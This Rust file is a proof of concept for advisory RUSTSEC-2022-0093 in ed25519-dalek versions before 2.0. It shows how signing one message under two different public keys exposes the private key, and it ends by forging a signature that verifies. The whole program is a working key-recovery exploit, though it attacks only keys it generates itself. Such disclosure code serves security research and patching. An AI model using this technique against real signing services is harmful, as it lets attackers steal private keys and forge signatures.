//! PoC for [RUSTSEC-2022-0093](https://rustsec.org/advisories/RUSTSEC-2022-0093).
//!
//! Versions of ed25519-dalek prior to v2.0 model private and public keys as
//! separate types which can be assembled into a Keypair, and also provide APIs for
//! serializing and deserializing 64-byte private/public keypairs.
//!
//! Such APIs and serializations are inherently unsafe as the public key is
//! one of the inputs used in the deterministic computation of the S part of the
//! signature, but not in the R value. An adversary could somehow use the signing
//! function as an oracle that allows arbitrary public keys as input can obtain
//! two signatures for the same message sharing the same R and only differ on the
//! S part.
//!
//! Unfortunately, when this happens, one can easily extract the private key.
//!
//! Revised public APIs in v2.0 of ed25519-dalek do NOT allow a decoupled
//! private/public keypair as signing input, except as part of specially labeled
//! "hazmat" APIs which are clearly labeled as being dangerous if misused.

use curve25519_dalek::Scalar;
use digest::Digest;
use ed25519_dalek::{ExpandedSecretKey, Keypair, PublicKey, SecretKey, Signer, Verifier};
use rand::rngs::OsRng;
use sha2::Sha512;

#[derive(Debug)]
struct SignatureData {
    s: Scalar,
    h: Scalar,
}

// A signature is computed as:
//
//     fn sign(secret, public, msg) -> Signature {
//         r = Hash(Hash(secret) + msg)
//         R = r * G
//         h = Hash(R.y + public + msg)
//         s = R.y + h * secret
//         Signature { R.y, s }
//     }
//
// Changing only the `public` component we obtain a signature where only the `s`
// component is different.
//
//     sig1 = (Ry, s1) = sign(secret, public1, msg)
//     sig2 = (Ry, s2) = sign(secret, public2, msg)
//
//    → (s1 - s2) = (Ry + h1*secret) - (Ry + h2*secret) = (h1 - h2)*secret
//    → secret = (s1 - s2)*(h1 - h2)^-1
fn signature_data(secret: &SecretKey, public: &PublicKey, msg: &[u8]) -> SignatureData {
    let mut keypair_bytes = [0u8; 64];
    keypair_bytes[..32].copy_from_slice(secret.as_bytes());
    keypair_bytes[32..].copy_from_slice(&public.to_bytes());
    let keypair = Keypair::from_bytes(&keypair_bytes).unwrap();

    let sig_bytes = keypair.sign(msg).to_bytes();
    let mut r = [0; 32];
    r.copy_from_slice(&sig_bytes[..32]);
    let mut s = [0; 32];
    s.copy_from_slice(&sig_bytes[32..]);

    println!("R: {}, S: {}", hex::encode(r), hex::encode(s));

    let mut h = Sha512::new();
    h.update(r);
    h.update(public.as_bytes());
    h.update(msg);

    SignatureData {
        s: Scalar::from_canonical_bytes(s).unwrap(),
        h: Scalar::from_hash(h),
    }
}

fn main() {
    let msg = b"HelloWorld";

    // Legit signature
    let sec1 = SecretKey::generate(&mut OsRng);
    let pub1 = PublicKey::from(&sec1);
    let sig1 = signature_data(&sec1, &pub1, msg);

    // Construct another random pair just to get the public component
    // and "somehow" trick the signer to use a different public component
    // for keypair (note we are using `sec1` to sign the data).
    let sec2 = SecretKey::generate(&mut OsRng);
    let pub2 = PublicKey::from(&sec2);
    let sig2 = signature_data(&sec1, &pub2, msg);

    // Recover the expanded secret.
    let expanded_sec = (sig1.s - sig2.s) * (sig1.h - sig2.h).invert();
    println!("expanded-sec: {}", hex::encode(expanded_sec.to_bytes()));

    // Build an expanded secret structure.
    // We don't care about the nonce component (the second half of bytes).
    let mut bytes = [0; 64];
    bytes[..32].copy_from_slice(&expanded_sec.to_bytes());
    let exp_sec = ExpandedSecretKey::from_bytes(&bytes).unwrap();

    // Check signature validity
    let sig = exp_sec.sign(msg, &pub1);
    if pub1.verify(msg, &sig).is_ok() {
        println!("Signature verified");
    } else {
        println!("Not verified");
    }
}
